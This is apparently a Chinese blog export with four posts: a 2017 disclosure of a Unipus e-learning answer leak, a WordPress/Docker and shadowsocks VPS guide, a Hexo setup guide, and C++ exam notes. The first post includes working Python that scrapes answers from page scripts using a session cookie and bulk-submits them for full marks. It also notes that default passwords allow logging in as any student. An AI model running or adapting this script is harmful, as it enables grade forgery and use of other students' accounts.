供了便捷。\n\n在网页源码中保存有答案信息\n\nUnipus平台中各章节均有固定的网址格式(以视听说3为例)：\nhttp://192.168.115.248:81/book/book183/U2_S2_2.php\n其访问结构为：\n\n服务器IP:81端口/book/book/book183(书本信息)/U(章号)S(节号)(小节号).php\n\n通过对所有本书任务进度表格（图1）的解析\n\n不难推测出所有作业所对应的php网址，如下图所示代码。\n\n通过运用chrome浏览器的开发者工具箱，我通过对源码的分析，发现在php脚本script标签的下，存在#answer函数下。其中保存有用户所填的答案，以及该题的正确答案，见下图：\n\n\n上图即是该题的正确答案（#^符号分割）。即认为：视听说3教程的答案对用户是公开的，任何人要可以对源码进行解析，都可以挖掘出正确答案。这一点，无异于考试时，直接把答案印在某些人的试卷上，破坏公平竞争。\n可能老师认为这一点并无关大碍，认为只有极少数人员会采用这种方式，但如果该情况被其他一些有心人发现，并针对该漏洞进行开发，会实现下列功能。\n因为大家基本都采用默认密码形式，因此只需要掌握全体同学学号，既可以模拟登录。并通过get协议保存服务器所保存的cookies值，访问各章节的url，保存答案。最后通过伪造登录信息，构建data\nform，批量用post协议提交答案。\n通过以上的方式，简单来说，就可以轻松达到：只需要账号（学号），就可以刷章节满分答案！而且单账号处理时间&lt;\n3s，效果如图：\n\n而且更可能的情况是，通过对提交的答案的控制，亦可以控制分数使其为代码执行者所想的分数。\n希望学校能稍稍重视该问题，也是我的一点荣幸。\n2017-9-14\n\n备注：以下代码均由本人进行开发，并未对外进行公布和流传，仅仅做实验性质。如果需要，可立即对代码源文件进行删除\n# main.pyfrom ans_deal import workimport requestsmap= [    [0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0],    [1, 1, 1, 1, 0, 1, 1],    [1, 1, 1, 1, 1, 1, 1],    [1, 1, 1, 1, 0, 1, 1],    [1, 1, 1, 0, 1, 0, 1],    [0, 0, 0, 0, 0, 0, 0],    [1, 1, 1, 1, 1, 1, 1],    [1, 1, 1, 1, 1, 1, 1],    [1, 1, 1, 1, 1, 1, 1],    [1, 1, 1, 1, 1, 1, 1],    [1, 1, 1, 1, 1, 1, 1],    [1, 1, 1, 1, 1, 1, 0],    [0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0],]cookies = input()post_headers = &#123;    &#x27;Host&#x27;: &#x27;192.168.115.248:81&#x27;,    &#x27;Connection&#x27;: &#x27;keep-alive&#x27;,    &#x27;Pragma&#x27;: &#x27;no-cache&#x27;,    &#x27;Cache-Control&#x27;: &#x27;no-cache&#x27;,    &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36&#x27;,    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;,    # &#x27;Referer&#x27;: &#x27;http://192.168.115.248:81/book/book183/U1_S2_5.php&#x27;,    &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,    &#x27;Accept-Language&#x27;: &#x27;zh,zh-CN;q=0.8&#x27;,    &#x27;Cookie&#x27;: &#x27;NCCE=&#x27; + cookies&#125;need = 2SectionID = 0SisterID = 0ItemID = 0for col in range(0, need):    for row in range(0,23):        UnitID = col + 1        if row &lt;= 4:            SectionID = 1            SisterID = row + 1        elif row &lt;= 9:            SectionID = 2            SisterID = row - 4        elif row &lt;= 15:            SectionID = 3            SisterID = row - 9        elif row &lt;= 17:            SectionID = 4            SisterID = row - 15        elif row &lt;= 22:            SectionID = 4            SisterID = row - 17        if map[row][col] == 1:            url = &#x27;http://192.168.115.248:81/book/book183/U&#x27;+str(UnitID)+&#x27;_S&#x27;+str(SectionID)+&#x27;_&#x27;+str(SisterID)+&#x27;.php&#x27;            TestID = str(SectionID) + &#x27;.&#x27; + str(SisterID)            KidID = &#x27;1&#x27;            ItemID = col *23 + row + 1            print(url)            ans = work(url, cookies)            form = &#123;                &#x27;UnitID&#x27;: str(UnitID),                &#x27;SectionID&#x27;: str(SectionID),                &#x27;SisterID&#x27;: str(SisterID),                &#x27;TestID&#x27;: TestID,                &#x27;KidID&#x27;: KidID,                &#x27;ItemID&#x27;: str(ItemID),                &#x27;Item_0&#x27;:&#x27;&#x27;            &#125;            for x,t in enumerate(ans):                form[&#x27;Item_&#x27; + str(x)] = t            print(form)            requests.post(url=url, headers = post_headers, data= form)\n#ans_deal.py#coding=utf-8import requestsfrom bs4 import BeautifulSoupdef deal_answer(list):    #list格式 A^B^C^D^    ans =[]    word = &#x27;&#x27;    for i,t in enumerate(list):        if t != &#x27;^&#x27;:            word += t        else:            if word[-1]==&#x27;#&#x27;:                word = word[:-1]            if word.find(&#x27;|&#x27;) != -1:                word = word[:word.find(&#x27;|&#x27;)]            ans.append(word)            word = &#x27;&#x27;    return ansdef work(url, cookies):    #url = &#x27;http://192.168.115.248:81/book/book183/U1_S3_5.php&#x27;    # 选择题&#x27;http://192.168.115.248:81/book/book183/U1_S3_3.php&#x27;    # 填空题&#x27;http://192.168.115.248:81/book/book183/U1_S3_4.php&#x27;    # 排序题&#x27;http://192.168.115.248:81/book/book183/U1_S3_5.php&#x27;    # 表格勾选题 &#x27;http://192.168.115.248:81/book/book183/U2_S3_5.php&#x27;    #cookies = &#x27;ac51297530abeb41668a2fe69aec80a8&#x27;    get_headers = &#123;        &#x27;Host&#x27;: &#x27;192.168.115.248:81&#x27;,        &#x27;Connection&#x27;: &#x27;keep-alive&#x27;,        &#x27;Pragma&#x27;: &#x27;no-cache&#x27;,        &#x27;Cache-Control&#x27;: &#x27;no-cache&#x27;,        &#x27;Origin&#x27;: &#x27;http://192.168.115.248:81&#x27;,        &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36&#x27;,        &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,        &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;,        # &#x27;Referer&#x27;: &#x27;http://192.168.115.248:81/book/book183/U1_S2_5.php&#x27;,        &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,        &#x27;Accept-Language&#x27;: &#x27;zh,zh-CN;q=0.8&#x27;,        &#x27;Cookie&#x27;: &#x27;NCCE=&#x27; + cookies    &#125;    wb_data = requests.get(url, headers=get_headers)    wb_data.encoding = &#x27;utf-8&#x27;    # print(wb_data.apparent_encoding)    soup = BeautifulSoup(wb_data.text, &#x27;lxml&#x27;)    answers = soup.find_all(&#x27;script&#x27;)[-1].get_text()    # print(answers)    answer = &#x27;&#x27;    # 选择题    # judgeRadio(&#x27;.question&#x27;,&#x27;&#x27;,&#x27;C^B^A^C^D^A&#x27;)    num = 0    if answers.find(&quot;judgeRadio&quot;) != -1:        for x, t in enumerate(answers[answers.find(&quot;judgeRadio&quot;): len(answers) + 1]):            if t == &#x27;;&#x27;:                break            if t == &#x27;\\&#x27;&#x27;:                num += 1            if num == 5 and t != &#x27;\\&#x27;&#x27;:                answer += t            if num == 6:                answer += &#x27;^&#x27;                break        if answers != &#x27;&#x27;:            ans = deal_answer(answer)            print(ans)    # 排序题    # judgeDragQuestion(&#x27;.content-right .content-div&#x27;,&#x27;&#x27;,&#x27;D^B^E^A^C&#x27;,&#x27;^&#x27;,&#123;top:0,left:-487&#125;)    if answers.find(&quot;judgeDragQuestion&quot;) != -1:        for x, t in enumerate(answers[answers.find(&quot;judgeDragQuestion&quot;): len(answers) + 1]):            if t == &#x27;;&#x27;:                break            if t == &#x27;\\&#x27;&#x27;:                num += 1            if num == 5 and t != &#x27;\\&#x27;&#x27;:                answer += t            if num == 6:                answer += &#x27;^&#x27;                break        if answers != &#x27;&#x27;:            ans = deal_answer(answer)            tem = &#x27;&#x27;            for x, t in enumerate(ans):                if x != len(ans) - 1:                    tem += t + &#x27;,&#x27;                else:                    tem += t            ans = []            ans.append(tem)            print(ans)    # 表格勾选题    # judgeTableQuestion(&#x27;table input[type=checkbox]&#x27;,&#x27;&#x27;,&#x27;0^3^4^7^9^11^12&#x27;,&#x27;^&#x27;)    if answers.find(&quot;judgeTableQuestion&quot;) != -1:        for x, t in enumerate(answers[answers.find(&quot;judgeTableQuestion&quot;): len(answers) + 1]):            if t == &#x27;;&#x27;:                break            if t == &#x27;\\&#x27;&#x27;:                num += 1            if num == 5 and t != &#x27;\\&#x27;&#x27;:                answer += t            if num == 6:                answer += &#x27;^&#x27;                break        if answers != &#x27;&#x27;:            ans = deal_answer(answer)            tem = &#x27;&#x27;            for x, t in enumerate(ans):                if x != len(ans) - 1:                    tem += t + &#x27;,&#x27;                else:                    tem += t            ans = []            ans.append(tem)            print(ans)    # 填空题    # judgeCompletion(&#x27;.content-inner input[name^=Item_]&#x27;,&#x27;&#x27;,&#x27;looking forward#^apart from#^on#^used to get very cross#^angel#^pretty sad#^some cash&#x27;,&#x27;#^&#x27;)    if answers.find(&quot;judgeCompletion&quot;) != -1:        for x, t in enumerate(answers[answers.find(&quot;judgeCompletion&quot;): len(answers) + 1]):            if t == &#x27;;&#x27;:                break            if t == &#x27;\\&#x27;&#x27;:                num += 1            if num == 5 and t != &#x27;\\&#x27;&#x27;:                answer += t            if num == 6:                answer += &#x27;^&#x27;                break        if answers != &#x27;&#x27;:            ans = deal_answer(answer)            print(ans)    return ans\n学校的回复\n\n"},{"title":"迁移wordpress到DigitalOcean 下vps服务器+配置shdowsocks","url":"/2017/09/23/%E8%BF%81%E7%A7%BBwordpress%E5%88%B0DigitalOcean%20%E4%B8%8Bvps%E6%9C%8D%E5%8A%A1%E5%99%A8+%E9%85%8D%E7%BD%AEshdowsocks/","content":"\n迁移原因\n原WordPress配置在腾讯云的centOS 6.8，\n环境为镜像市场一键配置的。当初选择腾讯云的产品，是因为有学生优惠活动，2核/2G/1M带宽/20G硬盘+1年cn域名的使用权（12元每月）。但发现仅仅是做博客网站并不需要这样的配置，且cn域名也并非有我所想的域名。\n一次偶然机会，在知乎上看到介绍国外的一些vps服务器，其中digital\nocean（下简称DO）家的服务器最低每月5$\n,折合人民币35元左右，且通过github student\npackages能获得50 +\n他人推荐码10，共60，共60的优惠，相当于第一年完全免费，加上一个国外的独立ip，意味着以前每个月的购买vpn的钱也可以省下来。长远看，还是相当划算。\n因为WordPress的迁移，希望能更有自己的特色，就在阿里云购买的\nliuchang.men\n的新域名（10年/60元左右）。该域名和DO的服务器都不需要备案，这一点也很重要。（你永远也不知道在腾讯云cn域名备案，用了2个月才完全批下来的痛苦）\n\n基于docker的wordpress迁移\nDO下5$每月配置为：1G单核/512M内存/20G硬盘,整体配置在内存上略有缩水，但确实够用。带宽并未在官网列出，经过测试，大概有4M（500k/s）的上下行速度（美国纽约），这一点也为搭建shadowsocks提供了一个硬件基础。\n以前服务器初次搭建WordPress时，本是Ubuntu下从零搭建，但发现极其繁琐，后通过镜像商场直接选择已有的镜像，但系统为centOS，自己不太熟悉。此次，在网上充分查阅后，发现基于docker的安装相当简单。\n镜像选择\n镜像选择Docker on 16.04\n，下列镜像本来有WordPress，但需要40G硬盘，不符合我们5$每月的需求\n安装 WordPress Docker 镜像\nsudo docker pull eugeneware/docker-wordpress-nginx\n启动 WordPress 容器\n# 创建容器sudo docker run -p 80:80 --name docker-wordpress-nginx -d eugeneware/docker-wordpress-nginx # 启动容器docker start docker-wordpress-nginx\n容器开机自启动\ndocker run --restart=always  xxxx       # 创建时参数docker update --restart=always xxxx         # 若创建时未指定，可后期update\n访问网站 http:// + ip ，配置\nWordPress\n用wordpress自带的导入导出功能进行迁移\n注意：关于WordPress后台地址被改导致无法登陆后台的简单解决方法\n打开网站根目录下的wp-config.php文件，输入这一行代码\ndefine(&#x27;RELOCATE&#x27;,true);\n当 RELOCATE 的值为 true\n时，就会在你登录后台的时候把\nWordpress（去后台地址）URL改为你当前输入的，这样就可以不用修改数据来重置地址。记得解决后修改。\n基于docker的shadowsocks 配置\ndocker下用虚拟的方式配置一些环境确实方便，下面配置shadowsocks服务端也将基于docker\n安装shadowsocks\nsudo docker pull oddrationale/docker-shadowsocks\n配置shadowsocks\nsudo docker run -d -p 8888:8888 oddrationale/docker-shadowsocks -s 0.0.0.0 -p 8888 -k yourpassword -m aes-256-cfb\n其中，-d为后台运行 ， -p为端口映射 ，\n-s为ip，0.0.0.0为采用默认本机ip， -k 为密码\nshadowsocks客户端\n附上github上shadowsocks的客户端链接：\n\nwidows：https://github.com/shadowsocks/shadowsocks-windows\nandroid： https://github.com/shadowsocks/shadowsocks-android\nios(未测试)：https://github.com/herzmut/shadowsocks-iOS\n\n\n2017-11-17更新:\n原服务器因为未知原因，下行带宽被限制到0.1M，暂迁移到旧金山的DO，可以借助快照迁移完成。\n附一张网速测试图：\n\n"},{"title":"迁移博客到Hexo(NexT主题) + GitHub Pages","url":"/2019/03/19/%E8%BF%81%E7%A7%BB%E5%8D%9A%E5%AE%A2%E5%88%B0Hexo(NexT%E4%B8%BB%E9%A2%98)%20+%20GitHub%20Pages/","content":"背景\n个人以前博客常挂在自建的基于docker的WordPress平台，但往日学艺不精，对docker操作陌生，都是基于别人的模板快速搭建；尽近两年来，经历了多次迁移：\n\n腾讯云（centOS） → 阿里云（ubuntu） → DigitalOcean（ubuntu）\n\n同时也经过了多次的版本升级，且前期多是在wordpress内置的编辑器中编写，也尝试过百度UEditor编辑器\n，最终转到MarkDown编辑器。除此外，图床也一变再变，过程中多次忘记备份，导致存在一些图片缺失。\n回想写博客的本质，是为了记录心路，学习知识。实在不应该放过多时间在博客建设本身😢。\n思前想后，还是准备把博客落脚在GitHub\nPage，不用去考虑数据库、cdn等，仅采用静态页面，一篇文章也为一份md文件，图床部分也不去用七牛等服务商，就是oneDrive的分享，简单直接。写博客也应该像提交代码一样，commit\n+ push😉。\n大致步骤如下：\nGitHub建立固定格式仓库\n登录GitHub，新建一个仓库，在Repository\nname中输入新建仓库的名称，我们现在是要搭建自己的个人博客，Repository\nname是有固定格式的：name.github.io，其中name可以随便填，一般是用自己的名字，点击Create\nRepository。\n\n配置Git\n安装Git\nGit下载地址，选择适合版本，默认安装即可，安装后git相关命令会自动添加到系统path。可通过：\ngit --version\n来确认。\n\n配置Git\n为了把本地的仓库中的内容传输到GitHub上，需要配置ssh\nkey，无论是上传自己的博客还是上传其他的仓库都需要连接Github，ssh\nkey是一个token，作用是身份验证。 为了在本地创建ssh key，打开Git\nBash，输入命令：\nssh-keygen -t rsa -C &quot;email&quot;  # email是我们在注册Github时使用的邮箱\n输入上面的命令后按Enter键，Git Bash会提示:\nEnter file in which to save the key (/c/Users/sun/.ssh/id_rsa):_\n直接按Enter，Git Bash会在默认路径C:.ssh下生成几个文件。\n然后Git Bash又给出提示：\nEnter passphrase &lt;empty for no passphrase&gt;:_\n这是在提示我们输入密码，直接回车表示不设置密码；此处我不设置密码，然后Git\nBash要求我们重复密码，也直接回车，然后就会提示ssh key已经生成。\n\n\n点击Settings；\n在页面左侧找到Deploy keys并点击；\n点击右侧的Add deploy key按钮，title随意填，Key填写ssh\nkey文件中复制的key（包括ssh-ras头）；\n点击Add Key，保存ssh key。\n\n\n我们需在本地验证ssh key设置是否成功，打开cmd，输入命令：\nssh -T git@github.com\n若看到\nYou’ve successfully authenticated, but GitHub does not provide shell access\n表示当前已经成功地连接上了自己的GitHub账户\n接下来，设置一下自己的用户名和邮箱\ngit config --global user.name &quot;my_github_name&quot;git config --global user.email &quot;my_github_email&quot;\n至此，我们已经成功地将个人电脑和Github账号连接。\n安装node.js 和 hexo\n安装node.js\nnode.js下载地址\n按照需要选择不同的版本，下载到本地之后，直接双击安装，一路默认即可，node.js安装后，会自动配置环境变量，打开windows的控制台，输入命令：\nnode -v\n\n安装Hexo\nhexo项目须在电脑的磁盘里新建一个空文件夹，在我的电脑上是*C:_next*，用于存放本地仓库，和Github上的xxxxx.github.io是对应的，下面以命令行为例，完成Hexo安装\nmkdir C:\\Users\\smile\\hexo_next   # 新建文件夹cd C:\\Users\\smile\\hexo_nextnpm install hexo -g      # 安装Hexo,-g代表全局安装\n安装耗时较长，最终可通过\nhexo -v\n检测安装\n搭建本地测试环境\n初始化*C:_next*这个文件夹，打开Git Bash进入此目录，输入命令：\nhexo initnpm install      # 安装Hexo所需要的组件hexo g       # 产生webapp文件hexo s       # 开启服务器\n此时控制台提示：\nINFO  Start processingWARN  ===============================================================WARN  ========================= ATTENTION! ==========================WARN  ===============================================================WARN   NexT repository is moving here: https://github.com/theme-nextWARN  ===============================================================WARN   It&#x27;s rebase to v6.0.0 and future maintenance will resume thereWARN  ===============================================================INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.\n表明启动成功\n使用next设计个性化博客\n将Hexo的主题切换为NexT\n进入到*C:_next*文件夹，打开cmd\ngit clone https://github.com/theme-next/hexo-theme-next themes/next\n打开C:_next\\_config.yml\n把theme: lansscape改为theme: next\n\n切换Next主题\n进入C:_next，打开NexT的配置文件_config.yml，选择自己喜欢的主题样式，选择哪个样式就需要把主题前面的#去掉\n\n设置动态背景\n在*C:_next\\_config.yml*中，canvas_nest设置成ture，并且可选多种动态背景\n\n取消侧边栏目录的自动编号\n在*C:_next\\_config.yml*中，修改toc下number属性为false\n\n在右上角或者左上角实现fork\nme on github\n\n在GitHub\nRibbons或GitHub\nCorners选择自己喜欢的挂饰，拷贝方框内的代码\n将复制的代码放到C:_next_layout.swig文件中，放在\n&lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;\n后面，如下图\n\n实现文章字数统计和阅读时长功能\nnpm install hexo-wordcount --save\n编辑*C:_next\\_config.yml*，找到post_wordcount，将所有的false都改为true：\n\nHexo博客添加站内搜索\n需要安装 hexo-generator-search，输入命令：\nnpm install hexo-generator-search --save\n安装 hexo-generator-searchdb，输入命令：\nnpm install hexo-generator-searchdb --save\n编辑*C:_next\\_config.yml*，找到Local search，做如下设置：\n\n效果如下：\n\n连接Hexo和Github\nPages及部署博客\n接下来就是将Hexo与GitHub Pages连接起来\n打开*C:_next\\_config.yml*文件，找到deploy字段，改为如下内容\ndeploy:    type: git    repository: git@github.com:user_name/respname.github.io.git    branch: master\n填写GitHub的用户名 和 博客仓库名，如下图所示\n\n在产生webapp应用和部署到GitHub之前，需要安装一个扩展插件，在C:_next中打开cmd，输入命令：\nnpm install hexo-deployer-git --save\n使用命令：\nhexo clean &amp; hexo d -g  # hexo g 生成webapp应用  # hexo d 部署\n就可以发布到GitHub上啦！😉\n"},{"title":"面向对象编程内容考点总结","url":"/2018/01/26/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E5%86%85%E5%AE%B9%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/","content":"\n引用调用方式\n\n类型名 &amp;引用名 (变量名) 或 类型名 &amp;引用名 = 变量名\n\n\n引用是别名，建立引用时必须初始化\n形参是引用，实参是变量\n\n内联函数\n\ninline 类型说明符 被调用函数名(形参表)\n\n\n必须提前声明和定义\n内联函数不交换控制权\n不支持递归、循环、switch选择等复杂语句\n\n面向对象三大特性\n\n继承性\n封装性\n多态性\n\n类特性\n抽象性 隐藏性 封装性 多态性\n类是对象的抽象， 对象是类的实例\n\npublic 权限开放\nprivate 仅成员和友元\nprotected 成员、友元、派生\n\n\n\n\n继承方式\npublic\nprotected\nprivate\n\n\n\n\npublic\npublic\nprotected\nprivate\n\n\nprotected\nprotected\nprotected\nprivate\n\n\nprivate\nprivate\nprivate\nprivate\n\n\n\n复制构造函数\n\n类名 (const 类名 &amp;对象名)；\n\nconst 为保护实参对象可读，可省略\n对象名是本类对象的引用，根据需求确定\nclass A&#123;public:    A(int a);    A(const A &amp;a);&#125;;A a(1);A b(a);     // 方式1A c = b;    // 方式2\n静态成员(static)\n静态数据成员\n\n静态数据成员必须初始化，且必须单独初始化\n定义时候不加 private/public/protected\n静态数据成员也可以定义为私有的静态数据成员\n\n\n数据类型 类名:: 静态数据成员 = 值；\n\n静态成员函数\n\n静态成员函数可以引用静态成员，不能直接引用非静态\n\n\n类名::静态成员函数(参数表)\n\n友元\n友元函数 可放在类中任意位置，效果相同\n\nfriend 返回类型 函数名(参数表)\n\n友元类\n派生类构造函数\n派生类名(派生类构造函数总参数表):&lt;基类构造函数&gt;(&lt;参数表1&gt;),&lt;子对象名&gt;(&lt;参表2&gt;)  &#123;    &lt;派生类中数据成员初始化&gt;&#125;\n派生类的析构函数\n\n先执行派生类的析构函数，再执行基类的析构函数\n各个基类构造函数的执行顺序取决于定义派生类时所指定的各个基类的顺序，而与派生类构造函数的成员初始化列表中给定的基类顺序无关。\n\n动态联编\n三条件\n\n虚函数\n满足复制兼容规则\n成员函数/指针/引用调用虚函数\n\n抽象类\n\n至少含一个纯虚函数\n\n\nvirtual   ()=0;\n\n\n不能建立对象\n\n运算符重载\n//成员函数&lt;返回值类型&gt; operator&lt;运算符&gt;(&lt;参数表&gt;)&#123;  ……&#125;//友元函数friend &lt;返回值类型&gt; operator&lt;运算符&gt;(&lt;参数表&gt;)&#123;  ……&#125;\nC\n= [ ] () -&gt;\n这四个运算符只能被重载为类的非静态成员函数\n赋值兼容规则\n\n派生类对象可以赋值给基类对象\n派生类对象可以初始化基类引用\n基类对象可以指向派生类对象\n\n其他\n\n代码复用的三种方式：继承、模板、组合\n提取运算符&gt;&gt; ,插入运算符&lt;&lt;\n运算符重载要求保持其原来的操作数个数、优先级、结合性和语法结构\n\n"}]